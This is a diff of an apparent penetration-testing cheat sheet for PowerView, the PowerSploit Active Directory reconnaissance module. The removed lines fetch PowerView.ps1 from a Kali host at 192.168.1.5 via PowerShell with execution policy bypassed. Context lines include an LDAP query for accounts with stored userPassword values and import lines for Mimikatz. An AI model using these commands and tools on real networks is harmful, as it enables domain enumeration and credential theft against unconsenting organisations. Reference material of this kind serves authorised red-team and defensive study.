@@ -1,17 +1,6 @@
 PowerView
 
 
-# Download from Kali
-cd /opt/PowerSploit/Recon/
-python -m SimpleHTTPServer
-
-- Windows
-cd to a discrete, writable directory (C:\Users\<user>\Desktop)
-powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/PowerView.ps1', 'PowerView.ps1')"
-powershell.exe -nop -exec bypass
-Import-Module .\PowerView.ps1
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 - Misc Functions
 Export-PowerViewCSV              Thread-safe CSV append
 Set-MacAttribute                 Sets MAC attributes for a file based on another file or input (from Powersploit)
@@ -306,7 +295,7 @@ $FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Proper
 
 HarmJ0y/44con_demo.ps1
 
-# Import PowerView and Invoke-Mimikatz
+# Import PowerView and Mimikatz
 Import-Module .\powerview.ps1
 Import-Module .\mimikatz.ps1
 
